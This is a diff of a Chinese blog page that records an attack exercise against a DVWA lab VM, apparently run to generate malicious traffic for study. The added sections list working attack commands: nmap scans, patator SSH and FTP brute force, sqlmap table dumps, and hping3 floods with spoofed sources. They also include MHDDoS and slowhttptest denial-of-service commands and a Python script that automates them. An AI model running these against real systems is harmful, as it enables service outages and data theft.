@@ -27,7 +27,7 @@ https://github.com/alex-shpak/hugo-book
   <meta itemprop="description" content="一、环境侦测#1.1 Linux系统内核信息#[root@xnwlaqbc ~]# uname -aLinux xnwlaqbc 5.10.0-216.0.0.115.oe2203sp4.x86_64 #1 SMP Thu Jun 27 15:13:44 CST 2024 x86_64 x86_64 x86_64 GNU/Linux[root@xnwlaqbc ~]# hostnamectlStatic hostname: xnwlaqbcIcon name: computer-vmChassis: vmMachine ID: 16bd4a31931045a6b7abcfa9100d1164Boot ID: 043a5f3240d1408199b437ff1b6d1611Virtualization: kvmOperating System: openEuler 22.03 (LTS-SP4)Kernel: Linux 5.10.0-216.0.0.115.oe2203sp4.x86_64Architecture: x86-64Hardware Vendor: QEMUHardware Model: Standard PC _i440FX &#43; PIIX, 1996_[root@xnwlaqbc ~]# cat /proc/versionLinux version 5.10.0-216.0.0.115.oe2203sp4.x86_64 (root@dc-64g.compass-ci) (gcc_old (GCC) 10.3.1, GNU ld (GNU Binutils) 2.37) #1 SMP Thu Jun 27 15:13:44 CST 20241.2 docker部署#思路：下载docker压缩包，下载dvwa的docker包，在服务器上部署">
   <meta itemprop="datePublished" content="2026-04-16T00:00:00+00:00">
   <meta itemprop="dateModified" content="2026-04-16T00:00:00+00:00">
-  <meta itemprop="wordCount" content="1429">
+  <meta itemprop="wordCount" content="2230">
 
 <title>xnwlaqbc靶机部署与攻击 | vnccer</title>
 <link rel="icon" href="/ak47.png" >
@@ -37,7 +37,7 @@ https://github.com/alex-shpak/hugo-book
 
 
   <script defer src="/fuse.min.js"></script>
-  <script defer src="/en.search.min.718b44eda790c36172fea9ff459c69254f58aa32a57f387232a79b27215dca58.js" integrity="sha256-cYtE7aeQw2Fy/qn/RZxpJU9YqjKlfzhyMqebJyFdylg=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.795dfb1f2d832c7b91321e2217a250444744cb065734b2c9ff4b8d11be19f512.js" integrity="sha256-eV37Hy2DLHuRMh4iF6JQREdEywZXNLLJ/0uNEb4Z9RI=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -298,6 +298,20 @@ https://github.com/alex-shpak/hugo-book
         </li>
       
     
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/SQL-Injection/" class="">
+      SQL Injection</a>
+  
+
+        </li>
+      
+    
   </ul>
 
         </li>
@@ -344,20 +358,6 @@ https://github.com/alex-shpak/hugo-book
   
     <a href="/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/" class="">
       基于docker的log4j2（CVE-2021-44228）漏洞（源问题复现失败）</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/cybersecurity/vulnerabilities/log4j2.8.1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="">
-      log4j2.8.1漏洞复现</a>
   
 
         </li>
@@ -743,20 +743,6 @@ https://github.com/alex-shpak/hugo-book
         </li>
       
     
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E7%AA%81%E5%8F%91%E7%89%B9%E5%BE%81%E8%AF%8D%E5%85%83%E8%87%AA%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
-      基于突发特征词元自学习的未知加密恶意流量检测方法</a>
-  
-
-        </li>
-      
-    
   </ul>
 
         </li>
@@ -886,6 +872,20 @@ https://github.com/alex-shpak/hugo-book
   
     <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
       anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/linux-clash%E9%83%A8%E7%BD%B2/" class="">
+      linux clash部署</a>
   
 
         </li>
@@ -1087,216 +1087,6 @@ https://github.com/alex-shpak/hugo-book
         </li>
       
     
-      
-        <li class="book-section-flat" >
-          
-  
-  
-
-  
-    <a>
-      Shortcodes</a>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/asciinema/" class="">
-      Asciinema</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/buttons/" class="">
-      Buttons</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/columns/" class="">
-      Columns</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/details/" class="">
-      Details</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-be0ad0cb4491738803198fdeca347a1c" class="toggle"  />
-    <label for="section-be0ad0cb4491738803198fdeca347a1c" class="flex">
-      <a role="button" class="">
-        Experimental</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/experimental/badges/" class="">
-      Badges</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/experimental/cards/" class="">
-      Cards</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/experimental/images/" class="">
-      Images</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/hints/" class="">
-      Hints</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/mermaid/" class="">
-      Mermaid</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/steps/" class="">
-      Steps</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/tabs/" class="">
-      Tabs</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/shortcodes/katex/" class="">
-      KaTeX</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
   </ul>
 
 
@@ -1373,6 +1163,22 @@ https://github.com/alex-shpak/hugo-book
         <li><a href="#34-database漏洞攻击sql-injection">3.4 database漏洞攻击（SQL Injection）✅</a></li>
         <li><a href="#35-口令暴力破解攻击brute-force">3.5 口令暴力破解攻击（Brute Force）✅</a></li>
         <li><a href="#36-iot漏洞攻击">3.6 IoT漏洞攻击✅</a></li>
+      </ul>
+    </li>
+    <li><a href="#四420攻击记录">四、4.20攻击记录</a></li>
+    <li><a href="#五慢速攻击和l7攻击测试">五、慢速攻击和L7攻击测试</a>
+      <ul>
+        <li><a href="#51-low-rate-ddos">5.1 low-rate ddos</a></li>
+        <li><a href="#52-mhdos">5.2 MHDoS</a></li>
+        <li><a href="#521-安装">5.2.1 安装</a></li>
+        <li><a href="#522-http-flood">5.2.2 HTTP Flood</a></li>
+        <li><a href="#523-cc攻击">5.2.3 CC攻击</a></li>
+      </ul>
+    </li>
+    <li><a href="#六慢速攻击和l7自动化攻击脚本">六、慢速攻击和L7自动化攻击脚本</a>
+      <ul>
+        <li><a href="#61-脚本">6.1 脚本</a></li>
+        <li><a href="#62-初代版本问题">6.2 初代版本问题</a></li>
       </ul>
     </li>
   </ul>
@@ -1981,7 +1787,367 @@ num  target     prot opt source               destination
 </span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">[+] 50 条恶意流量构造完毕。请检查抓包文件。&#34;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">__name__</span> <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
-</span></span><span style="display:flex;"><span>    run_attack(</span></span></code></pre></div></article>
+</span></span><span style="display:flex;"><span>    run_attack(</span></span></code></pre></div><h1 id="四420攻击记录">四、4.20攻击记录<a class="anchor" href="#%e5%9b%9b420%e6%94%bb%e5%87%bb%e8%ae%b0%e5%bd%95">#</a></h1>
+<table>
+  <thead>
+      <tr>
+          <th>攻击流量大类</th>
+          <th>攻击流量小类</th>
+          <th>工具</th>
+          <th>172.31.171.162攻击起始点</th>
+          <th>172.31.171.155攻击起始点</th>
+          <th>OSI层级</th>
+          <th>命令</th>
+          <th>备注</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>扫描攻击</td>
+          <td>操作系统扫描</td>
+          <td>nmap</td>
+          <td>10:00</td>
+          <td>10:01</td>
+          <td>网络层/传输层 (L3/L4)</td>
+          <td>sudo nmap -O 172.31.132.2</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>扫描攻击</td>
+          <td>端口扫描</td>
+          <td>nmap</td>
+          <td>10:02</td>
+          <td>10:01</td>
+          <td>传输层 (L4)</td>
+          <td>sudo nmap -p- 172.31.132.2</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>暴力破解</td>
+          <td>FTP 破解</td>
+          <td>patator</td>
+          <td>10:07</td>
+          <td>10:37</td>
+          <td>应用层 (L7)</td>
+          <td>patator ftp_login host=172.31.132.2 user=root password=FILE0 0=/usr/share/wordlists/dirb/common.txt</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>暴力破解</td>
+          <td>SSH 破解</td>
+          <td>patator</td>
+          <td>10:10</td>
+          <td>10:41</td>
+          <td>应用层 (L7)</td>
+          <td>patator ssh_login host=172.31.132.2 user=root password=FILE0 0=/usr/share/wordlists/dirb/common.txt</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Web 攻击</td>
+          <td>XSS 攻击</td>
+          <td>sqlmap</td>
+          <td>10:14</td>
+          <td>10:45</td>
+          <td>应用层 (L7)</td>
+          <td>sudo sqlmap -u &ldquo;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&rdquo; &ndash;cookie=&ldquo;security=low; PHPSESSID=http://172.31.132.2:8080/tos65u8ssfccgts283ltf8c337&rdquo; -D dvwa -T users &ndash;dump &ndash;batch</td>
+          <td>修改cookies</td>
+      </tr>
+      <tr>
+          <td>Web 攻击</td>
+          <td>SQL 注入</td>
+          <td>sqlmap</td>
+          <td>10:15</td>
+          <td>10:47</td>
+          <td>应用层 (L7)</td>
+          <td>检测注入漏洞<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low&quot; --batch</code><br />枚举数据库名称<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low&quot; --dbs --batch</code><br />查看当前使用的数据库<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low&quot; --current-db --batch</code><br />枚举指定数据库下的所有表<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low&quot; -D dvwa --tables --batch</code><br />窃取特定表的数据<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low&quot; -D dvwa -T users --dump --batch</code><br /></td>
+          <td>修改cookies</td>
+      </tr>
+      <tr>
+          <td>Web攻击</td>
+          <td>命令注入</td>
+          <td>command_injection.py</td>
+          <td>10:18</td>
+          <td>10:10</td>
+          <td>应用层(L7)</td>
+          <td>python3 command_injection.py</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Web攻击</td>
+          <td>代码注入</td>
+          <td>file_inclusion.py</td>
+          <td>10:22</td>
+          <td>10:15</td>
+          <td>应用层(L7)</td>
+          <td>python3 file_inclusion.py</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>系统攻击</td>
+          <td>system漏洞攻击</td>
+          <td>msfconsole</td>
+          <td>10:24</td>
+          <td>10:02、10:11</td>
+          <td>传输层(L4)</td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Web攻击</td>
+          <td>database漏洞攻击</td>
+          <td>sqli_attack.py</td>
+          <td>10:28</td>
+          <td>10:06</td>
+          <td>应用层(L7)</td>
+          <td>python3 sqli_attack.py</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Web攻击</td>
+          <td>口令暴力破解攻击</td>
+          <td>brute_force.py</td>
+          <td>10:32</td>
+          <td>10:08、10:30</td>
+          <td>应用层(L7)</td>
+          <td>python3 brute_force.py</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Web攻击</td>
+          <td>IoT漏洞攻击</td>
+          <td>iot_attack.py</td>
+          <td>10:36</td>
+          <td>10:13</td>
+          <td>应用层(L7)</td>
+          <td>python3 iot_attack.py</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Web攻击</td>
+          <td>xss漏洞攻击</td>
+          <td>xss_attack.py</td>
+          <td></td>
+          <td>10:17</td>
+          <td>应用层(L7)</td>
+          <td>python3 xss_attack.py</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Web攻击</td>
+          <td>csrf漏洞攻击</td>
+          <td>csrf_attack</td>
+          <td></td>
+          <td>10:18</td>
+          <td>应用层(L7)</td>
+          <td>python3 csrf_attack</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>DDos</td>
+          <td>syn flood</td>
+          <td>hping3</td>
+          <td>10:42</td>
+          <td>10:51</td>
+          <td>传输层 (L4)</td>
+          <td>sudo hping3 -S &ndash;flood &ndash;rand-source -d 0 -p 8080 172.31.132.2<br /></td>
+          <td>防火墙关闭，桥接模式，SYN Flood，6线程</td>
+      </tr>
+      <tr>
+          <td>DDos</td>
+          <td>udp flood</td>
+          <td>hping3</td>
+          <td>10:45</td>
+          <td>10:06、10:51</td>
+          <td>传输层 (L4)</td>
+          <td>sudo hping3 &ndash;udp &ndash;flood &ndash;rand-source -d 0 -p 8080 172.31.132.2</td>
+          <td>防火墙关闭，桥接模式，UDP Flood，6线程</td>
+      </tr>
+      <tr>
+          <td>DDos</td>
+          <td>icmp flood</td>
+          <td>hping3</td>
+          <td>10:49</td>
+          <td>10:52</td>
+          <td>网络层 (L3)</td>
+          <td>sudo hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 56 172.31.132.2</td>
+          <td>防火墙关闭，桥接模式，UDP Flood，6线程</td>
+      </tr>
+      <tr>
+          <td>DDos</td>
+          <td>icmp flood</td>
+          <td>hping3</td>
+          <td>10:51</td>
+          <td>10:53</td>
+          <td>网络层 (L3)</td>
+          <td>sudo hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td>
+          <td>防火墙关闭，桥接模式，ICMP Flood（超大ICMP），6线程</td>
+      </tr>
+      <tr>
+          <td>DDos</td>
+          <td>syn flood</td>
+          <td>hping3</td>
+          <td>10:52</td>
+          <td></td>
+          <td>传输层 (L4)</td>
+          <td>hping3 -S &ndash;flood -d 0 -p 8080 172.31.132.2</td>
+          <td>防火墙关闭，net模式</td>
+      </tr>
+      <tr>
+          <td>DDos</td>
+          <td>udp flood</td>
+          <td>hping3</td>
+          <td>10:54</td>
+          <td></td>
+          <td>传输层 (L4)</td>
+          <td>hping3 &ndash;udp &ndash;flood -d 0 -p 8080 172.31.132.2</td>
+          <td>防火墙关闭，net模式</td>
+      </tr>
+      <tr>
+          <td>DDos</td>
+          <td>icmp flood</td>
+          <td>hping3</td>
+          <td>10:55</td>
+          <td></td>
+          <td>网络层 (L3)</td>
+          <td>hping3 &ndash;icmp &ndash;flood -d 56 172.31.132.2</td>
+          <td>防火墙关闭，net模式</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="五慢速攻击和l7攻击测试">五、慢速攻击和L7攻击测试<a class="anchor" href="#%e4%ba%94%e6%85%a2%e9%80%9f%e6%94%bb%e5%87%bb%e5%92%8cl7%e6%94%bb%e5%87%bb%e6%b5%8b%e8%af%95">#</a></h1>
+<h2 id="51-low-rate-ddos">5.1 low-rate ddos<a class="anchor" href="#51-low-rate-ddos">#</a></h2>
+<ol>
+<li>
+<p>MHDoS慢速攻击：（先在MHDDoS文件夹里<code>touch empty.txt</code>）(13:22~13:27)
+python3 start.py SLOW http://172.31.132.2:8080/ 5 500 empty.txt 10 300</p>
+</li>
+<li>
+<p>slowloris(慢速请求头)：发送不完整的HTTP Header，让服务器一直等着。(13:42~13:44)
+slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://172.31.132.2:8080/ -x 24 -p 3</p>
+</li>
+<li>
+<p>slow post(慢速正文)：模拟大文件上传，但每次只发一个字节。(13:47~13:48)
+slowhttptest -c 1000 -B -i 10 -r 200 -s 8192 -t POST -u http://172.31.132.2:8080/ -x 10 -p 3</p>
+</li>
+<li>
+<p>slow read(慢速读取)：接收响应非常慢，强迫服务器将数据缓存在内核中。(13:50~13:52)
+slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -u http://172.31.132.2:8080/</p>
+</li>
+</ol>
+<h2 id="52-mhdos">5.2 MHDoS<a class="anchor" href="#52-mhdos">#</a></h2>
+<h2 id="521-安装">5.2.1 安装<a class="anchor" href="#521-%e5%ae%89%e8%a3%85">#</a></h2>
+<p>CC 攻击利用的是 HTTP 协议，模拟真实用户的浏览行为，这里选择MHDoS</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span><span style="color:#ff5c57">cd</span> MHDDoS
+</span></span><span style="display:flex;"><span>git clone https://github.com/MatrixTM/MHDDoS.git
+</span></span><span style="display:flex;"><span>python3 -m venv mhddos
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">source</span> mhddos/bin/activate
+</span></span><span style="display:flex;"><span>pip install -r requirements.txt
+</span></span><span style="display:flex;"><span>python3 start.py</span></span></code></pre></div><h2 id="522-http-flood">5.2.2 HTTP Flood<a class="anchor" href="#522-http-flood">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span>python3 start.py GET http://172.31.132.2:8080/ <span style="color:#ff9f43">5</span> <span style="color:#ff9f43">2000</span> empty.txt <span style="color:#ff9f43">100</span> 300<span style="color:#ff6ac1">(</span>13:54~13:59<span style="color:#ff6ac1">)</span></span></span></code></pre></div><h2 id="523-cc攻击">5.2.3 CC攻击<a class="anchor" href="#523-cc%e6%94%bb%e5%87%bb">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span>python3 start.py POST http://172.31.132.2:8080/ <span style="color:#ff9f43">5</span> <span style="color:#ff9f43">1500</span> empty.txt <span style="color:#ff9f43">50</span> 300<span style="color:#ff6ac1">(</span>14:02~14:07<span style="color:#ff6ac1">)</span></span></span></code></pre></div><h1 id="六慢速攻击和l7自动化攻击脚本">六、慢速攻击和L7自动化攻击脚本<a class="anchor" href="#%e5%85%ad%e6%85%a2%e9%80%9f%e6%94%bb%e5%87%bb%e5%92%8cl7%e8%87%aa%e5%8a%a8%e5%8c%96%e6%94%bb%e5%87%bb%e8%84%9a%e6%9c%ac">#</a></h1>
+<h2 id="61-脚本">6.1 脚本<a class="anchor" href="#61-%e8%84%9a%e6%9c%ac">#</a></h2>
+<p>自动化攻击脚本👇（先进入<code>/MHDDoS</code>）</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PYTHON" data-lang="PYTHON"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> datetime <span style="color:#ff6ac1">import</span> datetime, timedelta
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 1. 配置信息</span>
+</span></span><span style="display:flex;"><span>TARGET_URL <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://172.31.132.2:8080/login.php&#34;</span>
+</span></span><span style="display:flex;"><span>COOLDOWN_TIME <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">60</span>  <span style="color:#78787e"># 冷却时间，确保服务器连接完全释放</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># --- 路径自动校准 ---</span>
+</span></span><span style="display:flex;"><span>MHDDOS_PATH <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;/root/sec/attacker/MHDDoS&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 自动寻找存在的 Python 解释器</span>
+</span></span><span style="display:flex;"><span>potential_pythons <span style="color:#ff6ac1">=</span> [
+</span></span><span style="display:flex;"><span>    os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>join(MHDDOS_PATH, <span style="color:#5af78e">&#34;mhddos/bin/python3&#34;</span>), 
+</span></span><span style="display:flex;"><span>    os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>join(MHDDOS_PATH, <span style="color:#5af78e">&#34;venv/bin/python3&#34;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#34;/usr/bin/python3&#34;</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>VENV_PYTHON <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> p <span style="color:#ff6ac1">in</span> potential_pythons:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>exists(p):
+</span></span><span style="display:flex;"><span>        VENV_PYTHON <span style="color:#ff6ac1">=</span> p
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> <span style="color:#ff6ac1">not</span> VENV_PYTHON:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;❌ 错误：找不到任何可用的 Python 解释器！&#34;</span>)
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ff9f43">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 2. 任务清单 (格式: 任务名, 工具, 命令, 预计运行秒数)</span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># 定义代理文件的绝对路径</span>
+</span></span><span style="display:flex;"><span>PROXY_FILE <span style="color:#ff6ac1">=</span> os<span style="color:#ff6ac1">.</span>path<span style="color:#ff6ac1">.</span>join(MHDDOS_PATH, <span style="color:#5af78e">&#34;files/proxies/empty.txt&#34;</span>) <span style="color:#78787e">#</span>
+</span></span><span style="display:flex;"><span>tasks <span style="color:#ff6ac1">=</span> [
+</span></span><span style="display:flex;"><span>    (<span style="color:#5af78e">&#34;慢速攻击slowloris&#34;</span>, <span style="color:#5af78e">&#34;slowhttptest&#34;</span>, <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u </span><span style="color:#5af78e">{</span>TARGET_URL<span style="color:#5af78e">}</span><span style="color:#5af78e"> -x 24 -p 3&#34;</span>, <span style="color:#ff9f43">240</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#5af78e">&#34;慢速攻击slow post&#34;</span>, <span style="color:#5af78e">&#34;slowhttptest&#34;</span>, <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;slowhttptest -c 1000 -B -i 10 -r 200 -s 8192 -t POST -u </span><span style="color:#5af78e">{</span>TARGET_URL<span style="color:#5af78e">}</span><span style="color:#5af78e"> -x 10 -p 3&#34;</span>, <span style="color:#ff9f43">240</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#5af78e">&#34;慢速攻击slow read&#34;</span>, <span style="color:#5af78e">&#34;slowhttptest&#34;</span>, <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -u </span><span style="color:#5af78e">{</span>TARGET_URL<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>, <span style="color:#ff9f43">240</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#5af78e">&#34;慢速攻击&#34;</span>, <span style="color:#5af78e">&#34;MHDDoS&#34;</span>, <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">{</span>VENV_PYTHON<span style="color:#5af78e">}</span><span style="color:#5af78e"> </span><span style="color:#5af78e">{</span>MHDDOS_PATH<span style="color:#5af78e">}</span><span style="color:#5af78e">/start.py SLOW </span><span style="color:#5af78e">{</span>TARGET_URL<span style="color:#5af78e">}</span><span style="color:#5af78e"> 5 500 </span><span style="color:#5af78e">{</span>PROXY_FILE<span style="color:#5af78e">}</span><span style="color:#5af78e"> 10 300&#34;</span>, <span style="color:#ff9f43">300</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#5af78e">&#34;HTTP Flood&#34;</span>, <span style="color:#5af78e">&#34;MHDDoS&#34;</span>, <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">{</span>VENV_PYTHON<span style="color:#5af78e">}</span><span style="color:#5af78e"> </span><span style="color:#5af78e">{</span>MHDDOS_PATH<span style="color:#5af78e">}</span><span style="color:#5af78e">/start.py GET </span><span style="color:#5af78e">{</span>TARGET_URL<span style="color:#5af78e">}</span><span style="color:#5af78e"> 5 2000 </span><span style="color:#5af78e">{</span>PROXY_FILE<span style="color:#5af78e">}</span><span style="color:#5af78e"> 100 300&#34;</span>, <span style="color:#ff9f43">300</span>),
+</span></span><span style="display:flex;"><span>    (<span style="color:#5af78e">&#34;CC攻击&#34;</span>, <span style="color:#5af78e">&#34;MHDDoS&#34;</span>, <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">{</span>VENV_PYTHON<span style="color:#5af78e">}</span><span style="color:#5af78e"> </span><span style="color:#5af78e">{</span>MHDDOS_PATH<span style="color:#5af78e">}</span><span style="color:#5af78e">/start.py POST </span><span style="color:#5af78e">{</span>TARGET_URL<span style="color:#5af78e">}</span><span style="color:#5af78e"> 5 1500 </span><span style="color:#5af78e">{</span>PROXY_FILE<span style="color:#5af78e">}</span><span style="color:#5af78e"> 50 300&#34;</span>, <span style="color:#ff9f43">300</span>)
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>results <span style="color:#ff6ac1">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">run_research</span>():
+</span></span><span style="display:flex;"><span>    total_task_seconds <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">sum</span>(task[<span style="color:#ff9f43">3</span>] <span style="color:#ff6ac1">for</span> task <span style="color:#ff6ac1">in</span> tasks)
+</span></span><span style="display:flex;"><span>    total_cooldown_seconds <span style="color:#ff6ac1">=</span> COOLDOWN_TIME <span style="color:#ff6ac1">*</span> (<span style="color:#ff5c57">len</span>(tasks) <span style="color:#ff6ac1">-</span> <span style="color:#ff9f43">1</span>)
+</span></span><span style="display:flex;"><span>    total_duration <span style="color:#ff6ac1">=</span> total_task_seconds <span style="color:#ff6ac1">+</span> total_cooldown_seconds
+</span></span><span style="display:flex;"><span>    eta_finish <span style="color:#ff6ac1">=</span> datetime<span style="color:#ff6ac1">.</span>now() <span style="color:#ff6ac1">+</span> timedelta(seconds<span style="color:#ff6ac1">=</span>total_duration)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;✅ 成功锁定 Python 路径: </span><span style="color:#5af78e">{</span>VENV_PYTHON<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
